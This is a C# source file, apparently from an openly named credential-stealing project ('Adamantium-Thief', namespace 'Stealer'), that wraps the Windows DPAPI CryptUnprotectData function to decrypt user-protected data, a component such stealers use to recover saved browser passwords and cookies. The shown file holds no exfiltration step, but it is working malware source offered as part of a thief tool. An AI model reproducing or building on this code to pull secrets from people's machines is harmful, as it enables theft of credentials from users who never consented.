/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.Runtime.InteropServices;

// Decrypt data using DPAPI functions.
namespace Stealer
{
	internal class DPAPI
	{
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        public static byte[] Decrypt(byte[] bCipher, byte[] bEntropy = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();

            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = (string)null
            };

            string sEmpty = string.Empty;

            try
            {
                try
                {
                    if (bCipher == null)
                        bCipher = new byte[0];

                    pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                    pCipherText.cbData = bCipher.Length;
                    Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);

                }
                catch { }

                try
                {
                    if (bEntropy == null)
                        bEntropy = new byte[0];

                    pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                    pEntropy.cbData = bEntropy.Length;

                    Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);

                }
                catch { }

                CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

                byte[] bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;

            }
            catch
            {

            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);

                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);

                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
    }
}